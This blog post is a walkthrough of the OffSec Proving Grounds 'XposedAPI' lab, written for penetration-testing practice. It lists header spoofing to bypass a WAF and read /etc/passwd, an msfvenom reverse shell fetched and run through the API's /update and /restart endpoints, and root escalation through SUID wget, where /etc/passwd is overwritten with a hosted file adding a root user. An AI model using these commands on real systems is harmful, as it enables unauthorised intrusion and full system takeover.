---
layout: post
title: "Offsec Proving Grounds - XposedAPI Walkthrough"
subtitle: "Medium Difficulty"
date: 2025-12-28
author: "May Azcarraga"
categories: [security, penetration-testing]
tags: [offsec, api, rce, privilege-escalation, linux, suid, wget]
img: ":2025-12-28/play-hero.png"
image_viewer_on: true
image_lazy_loader_on: true
---

## Overview

**Challenge/Lab:** Offsec Proving Grounds - XposedAPI  
**Platform:** OffSec Labs  
**Difficulty:** Medium  
**Status:** ✅ Complete

### Summary

In this walkthrough, we exploit a target by abusing an API functionality in a web application, which allows us to upload and execute a malicious binary. We then escalate privileges by abusing misconfigured SUID permissions on the **wget** binary, allowing us to overwrite the sensitive **/etc/passwd** file and introduce a new user into the `root` group.

**OS:** Linux (Debian 10)

---

## Reconnaissance & Enumeration

### Initial Scan

We begin with a full port scan using `rustscan`:

```bash
rustscan -a $ip --accessible -r 1-65535 --ulimit 5000 -- -A -sC -sV
```

**Results:**

```
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
|   256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
13337/tcp open  http    syn-ack ttl 61 Gunicorn 20.0.4
|_http-title: Remote Software Management API
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD
|_http-server-header: gunicorn/20.0.4
```

**Findings:**
- Port 22 (SSH) - OpenSSH 7.9p1 Debian
- Port 13337 (HTTP) - Gunicorn 20.0.4 serving a "Remote Software Management API"

### HTTP Enumeration

Visiting `http://<target>:13337/` reveals an API documentation page:

![:xposed-api-home](:2025-12-28/Pasted-image-20251227161532.png)

The page warns: **"This utility should not be exposed to external network. It is just for management on localhost."**

The API exposes the following endpoints:

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/` | GET | Returns the documentation page |
| `/version` | GET | Returns version of the app |
| `/update` | POST | Updates the app using a Linux executable. Expects JSON: `{"user":"<user>", "url":"<url>"}` |
| `/logs` | GET | Read log files |
| `/restart` | GET | Restart the app |

---

## Vulnerability Analysis

### Vulnerability Identified

**Type:** Unauthenticated Remote Code Execution via API + WAF Bypass + SUID Privilege Escalation  
**Severity:** Critical

The `/update` endpoint accepts a URL to download a Linux executable (ELF) and the `/restart` endpoint executes it. The `/logs` endpoint appears to have Local File Inclusion (LFI) capabilities but is protected by a WAF.

---

## Exploitation

### Tools Used

| Tool | Purpose |
|------|---------|
| rustscan | Port scanning |
| Burp Suite | API request manipulation |
| msfvenom | Generate reverse shell payload |
| Python HTTP server | Host malicious binary |
| Netcat | Catch reverse shell |

### Step 1: Bypass WAF on the `/logs` endpoint

Attempting to access `/logs` directly returns:

```
WAF: Access Denied for this Host.
```

![:waf-denied](:2025-12-28/Pasted-image-20251227163011.png)

Recalling the message "It is just for management on localhost", we can bypass this WAF by manipulating the IP origin via HTTP headers.

#### Understanding IP Origin Manipulation

Many web applications implement IP-based access controls to restrict certain endpoints to localhost or internal networks. However, these controls often rely on HTTP headers that can be manipulated by attackers. Common headers used to determine the client's IP address include:

- `X-Forwarded-For` - Originally designed for proxies to indicate the original client IP
- `X-Originating-IP` - Alternative header for IP identification
- `X-Remote-IP` - Used by some load balancers
- `X-Remote-Addr` - Another variant for remote address
- `X-Client-IP` - Client IP header
- `X-Host` - Host identification
- `X-Forwarded-Host` - Forwarded host header

**Why this works:**
When a server checks if a request is coming from localhost, it may look at these headers instead of (or in addition to) the actual source IP. If the application trusts these headers without proper validation, an attacker can spoof their origin by simply adding the appropriate header.

#### Bypassing the WAF

Testing with Burp Suite, we add the `X-Forwarded-For` header set to `127.0.0.1` (localhost):

```
GET /logs?file=/etc/passwd HTTP/1.1
Host: 192.168.204.134:13337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-Forwarded-For: 127.0.0.1
Connection: keep-alive
```

![:lfi-success](:2025-12-28/Pasted-image-20251227163943.png)

Success! The server now believes the request is coming from localhost and grants access. The `/etc/passwd` file is returned, revealing the user `clumsyadmin`.

**Alternative headers to try:**
If `X-Forwarded-For` doesn't work, you can try other headers:

```
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Host: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
```

You can also try using multiple `X-Forwarded-For` headers:
```
X-Forwarded-For:
X-Forwarded-For: 127.0.0.1
```

### Step 2: Probe the `/update` endpoint

Testing the `/update` endpoint via Burp Suite with the discovered username:

![:update-endpoint](:2025-12-28/Pasted-image-20251227162849.png)

The endpoint requires:
- `user` field set to a valid username (we'll use `clumsyadmin`)
- `url` field pointing to a Linux ELF binary hosted on our server

### Step 3: Create and host the malicious payload

Generate a reverse shell using `msfvenom`:

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<attacker-ip> LPORT=4444 -f elf -o shell
```

![:msfvenom-shell](:2025-12-28/Pasted-image-20251227171345.png)

Host it with a Python web server:

```bash
python3 -m http.server 80
```

### Step 4: Upload the malicious binary

Send a POST request to `/update`:

```bash
curl -X POST http://<target>:13337/update \
  -H "Content-Type: application/json" \
  -H "X-Forwarded-For: localhost" \
  --data '{"user":"clumsyadmin","url":"http://<attacker-ip>/shell"}'
```
or burpsuite:

![:wget-overwrite](:2025-12-28/Pasted-image-20251227171120.png)

Response:
```
Update requested by clumsyadmin. Restart the software for changes to take effect.
```

The web server confirms the download:
```
<target-ip> - - [12/Mar/2021 08:26:34] "GET /shell HTTP/1.1" 200 -
```

### Step 5: Trigger execution via `/restart`

Start a Netcat listener:

```bash
nc -lvp 4444
```

The API documentation says `/restart` is a GET request, but examining the source code reveals it actually requires a POST:

```bash
curl -X POST http://<target>:13337/restart -H "X-Forwarded-For: localhost"
```

Response:
```
Restart Successful.
```

Our Netcat listener catches the reverse shell:

```bash
connect to [<attacker-ip>] from (UNKNOWN) [<target-ip>] 42202
python -c 'import pty; pty.spawn("/bin/bash")'
clumsyadmin@xposedapi:/home/clumsyadmin/webapp$ id
uid=1000(clumsyadmin) gid=1000(clumsyadmin) groups=1000(clumsyadmin)
```

---

## Post-Exploitation

### Access Achieved

**User:** clumsyadmin  
**Privilege Level:** User → Root (via SUID `wget`)

### Privilege Escalation

#### SUID Enumeration

Search for binaries with the SUID bit set:

```bash
find / -perm -u=s -type f 2>/dev/null
```

output:
```
clumsyadmin@xposedapi:/home/clumsyadmin/webapp$ find / -perm -u=s -type f 2>/dev/null
<admin/webapp$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/bin/mount
/usr/bin/passwd
/usr/bin/su
/usr/bin/wget
/usr/bin/fusermount
/usr/bin/umount
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/gpasswd
```

Or run Linpeas.sh yellow is gold to catch attention for possible privilege esclation:
![:suid-enum](:2025-12-28/Pasted-image-20251227165327.png)

Notable finding: `/usr/bin/wget` has the SUID bit set!

#### Exploiting SUID wget

When `wget` has the SUID bit set, it can be exploited to escalate privileges. According to [GTFOBins](https://gtfobins.github.io/gtfobins/wget/), there are two primary exploitation methods:

**Method 1: Shell Spawn via `--use-askpass`**
- Create a shell script that spawns `/bin/sh`
- Use wget's `--use-askpass` option to execute the script
- Spawn an interactive system shell

```bash
echo -e '#!/bin/sh\n/bin/sh 1>&0' >/path/to/temp-file
chmod +x /path/to/temp-file
wget --use-askpass=/path/to/temp-file 0
```
![:gtfobins-wget-suid](:2025-12-28/Pasted-image-20251227165545.png)

**Method 2: File Write**
- Use wget's `-O` option to write/overwrite files
- Overwrite sensitive system files like `/etc/passwd`, `/etc/shadow`, or `/root/.ssh/authorized_keys`
- Gain root access by modifying authentication files

---

**Our Approach: Method 2 - File Write to Overwrite `/etc/passwd`**

The `wget` binary's `-O` option allows us to overwrite any file on the system. We'll overwrite `/etc/passwd` to add a new root user.



**Step 1:** Create a local copy of `/etc/passwd` on the attacker machine

```bash
┌──(kali㉿kali)-[~]
└─$ cat passwd  
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
clumsyadmin:x:1000:1000::/home/clumsyadmin:/bin/sh
```

**Step 2:** Generate a password hash and add a new root user:

```bash
openssl passwd -1 -salt hacker pass123
# Output: $1$hacker$zVnrpoW2JQO5YUrLmAs.o1

echo 'hacker:$1$hacker$zVnrpoW2JQO5YUrLmAs.o1:0:0:root:/root:/bin/bash' >> passwd
```

**Step 3:** Host the modified `passwd` file:

```bash
python3 -m http.server 80
```

**Step 4:** On the target, use `wget` with SUID to overwrite `/etc/passwd`:

```bash
wget http://<attacker-ip>/passwd -O /etc/passwd
```



**Step 5:** Switch to the new root user:

```bash
su hacker
Password: pass123

root@xposedapi:/home/clumsyadmin/webapp# whoami
root
```

---

## Key Findings & Lessons Learned

### What Worked Well
- **WAF bypass** using `X-Forwarded-For` header spoofing to access restricted endpoints
- **LFI exploitation** to enumerate users via `/etc/passwd`
- **API abuse** leveraging `/update` + `/restart` endpoints to upload and execute a malicious ELF binary
- **SUID abuse** on `wget` for privilege escalation by overwriting `/etc/passwd`

### Challenges Encountered
- **Challenge:** WAF blocking access to the `/logs` endpoint
- **Resolution:** Spoofed the source IP using the `X-Forwarded-For: 127.0.0.1` header

- **Challenge:** The `/restart` endpoint documentation said GET but actually required POST
- **Resolution:** Examined the JavaScript source code on the restart page to discover the correct method

### Key Takeaways
- Always check for IP-based access controls that can be bypassed with headers like `X-Forwarded-For`, `X-Real-IP`, etc.
- API documentation may not always be accurate — verify behavior through testing
- SUID binaries like `wget`, `curl`, `find`, etc. can be powerful privilege escalation vectors
- The `/etc/passwd` file can be overwritten to add new root users if you have write access

---

## References

- [Hacktricks - Rate Limit Bypass Techniques](https://book.hacktricks.wiki/en/pentesting-web/rate-limit-bypass.html)
- [GTFOBins - wget SUID](https://gtfobins.github.io/gtfobins/wget/)
- [OWASP - IP Spoofing via HTTP Headers](https://owasp.org/www-community/pages/attacks/ip_spoofing_via_http_headers)

---

**Status:** ✅ Complete  
**Last Updated:** 2025-12-28
